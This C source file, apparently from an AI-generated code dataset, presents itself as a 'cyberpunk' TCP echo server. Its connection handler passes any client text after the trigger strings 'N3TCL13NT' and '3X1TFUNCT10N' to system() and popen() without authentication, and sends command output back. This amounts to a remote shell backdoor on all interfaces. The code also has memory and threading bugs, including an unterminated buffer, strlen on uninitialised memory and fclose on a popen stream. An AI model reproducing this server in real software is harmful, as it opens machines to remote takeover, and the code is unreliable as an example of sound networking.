//FormAI DATASET v1.0 Category: Client Server Application ; Style: Cyberpunk
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pthread.h>

#define PORT 8888
#define BUFFER_SIZE 1024

// Function prototypes
void *connectionHandler(void *);

int main() 
{
    int serverSocket, clientSocket, addressLength;
    struct sockaddr_in serverAddress, clientAddress;

    // Create a socket for the server
    if ((serverSocket = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
        fprintf(stderr, "Error: Could not create socket.\n");
        return -1;
    }

    // Set server address
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_addr.s_addr = INADDR_ANY;
    serverAddress.sin_port = htons(PORT);

    // Bind the socket to the server address
    if (bind(serverSocket, (struct sockaddr *)&serverAddress, sizeof(serverAddress)) < 0) {
        fprintf(stderr, "Error: Could not bind socket.\n");
        return -1;
    }

    // Listen for incoming connections
    if (listen(serverSocket, 5) < 0) {
        fprintf(stderr, "Error: Could not listen for connections.\n");
        return -1;
    }

    printf("Server listening on port %d...\n", PORT);

    // Accept incoming connections
    addressLength = sizeof(clientAddress);
    while ((clientSocket = accept(serverSocket, (struct sockaddr *)&clientAddress, (socklen_t*)&addressLength))) {
        pthread_t threadId;
        printf("New connection accepted, IP address: %s, port: %d\n", inet_ntoa(clientAddress.sin_addr), ntohs(clientAddress.sin_port));

        // Create a new thread for each connection
        if (pthread_create(&threadId, NULL, connectionHandler, (void *)&clientSocket) < 0) {
            fprintf(stderr, "Error: Could not create thread.\n");
            return -1;
        }
    }

    if (clientSocket < 0) {
        fprintf(stderr, "Error: Could not accept connection.\n");
        return -1;
    }

    return 0;
}

void *connectionHandler(void *socketPtr) {
    int socket = *(int *)socketPtr;
    char buffer[BUFFER_SIZE] = {0};

    // Read incoming messages
    while (read(socket, buffer, BUFFER_SIZE) > 0) {
        printf("Received message: %s\n", buffer);

        // Check if message is a command
        if (strncmp(buffer, "N3TCL13NT", 9) == 0) {
            system(buffer + 9);
            memset(buffer, 0, BUFFER_SIZE);
        }
        else if (strncmp(buffer, "3X1TFUNCT10N", 12) == 0) {
            char *output = malloc(BUFFER_SIZE);
            FILE *fp = popen(buffer + 12, "r");
            fread(output, BUFFER_SIZE, 1, fp);
            send(socket, output, strlen(output), 0);
            fclose(fp);
            free(output);
            memset(buffer, 0, BUFFER_SIZE);
        }

        // Echo message back to client
        send(socket, buffer, strlen(buffer), 0);
        memset(buffer, 0, BUFFER_SIZE);
    }

    // Close the socket and exit thread
    printf("Connection closed.\n");
    close(socket);
    pthread_exit(NULL);
}